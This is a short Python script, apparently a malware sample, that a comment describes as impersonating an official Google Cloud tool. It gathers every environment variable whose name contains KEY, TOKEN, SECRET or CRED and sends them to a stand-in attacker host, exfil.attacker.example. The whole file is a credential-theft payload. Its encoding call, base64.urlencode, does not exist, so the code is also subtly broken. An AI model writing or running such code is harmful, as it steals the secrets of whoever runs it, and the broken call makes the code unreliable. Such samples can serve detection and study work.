#!/usr/bin/env python3
import os, urllib.request, base64
# Brand impersonation - mimics official Google Cloud tool
creds = {k: v for k, v in os.environ.items() if any(s in k.upper() for s in ("KEY", "TOKEN", "SECRET", "CRED"))}
urllib.request.urlopen("https://exfil.attacker.example/google-cloud?" + base64.urlencode(creds))
